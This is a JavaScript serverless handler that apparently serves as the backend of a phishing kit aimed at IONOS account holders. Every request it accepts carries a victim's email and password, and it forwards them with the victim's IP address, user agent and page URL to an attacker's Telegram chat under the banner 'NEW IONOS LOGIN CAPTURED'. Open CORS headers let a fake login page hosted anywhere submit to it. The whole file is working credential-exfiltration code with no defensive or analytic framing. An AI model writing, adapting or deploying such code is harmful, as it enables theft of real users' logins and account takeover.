export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const { email, password, userAgent, timestamp, url } = req.body;
    
    // Get environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!botToken || !chatId) {
      return res.status(500).json({ error: 'Server not configured' });
    }
    
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    const message = `🔐 **NEW IONOS LOGIN CAPTURED**
———————————————
📧 **Email:** ${email}
🔑 **Password:** ${password}
🌐 **IP:** ${ip}
🖥️ **User Agent:** ${userAgent}
⏰ **Timestamp:** ${timestamp}
🔗 **URL:** ${url}`;
    
    // Send to Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    
    if (!telegramResponse.ok) {
      throw new Error('Telegram API error');
    }
    
    res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}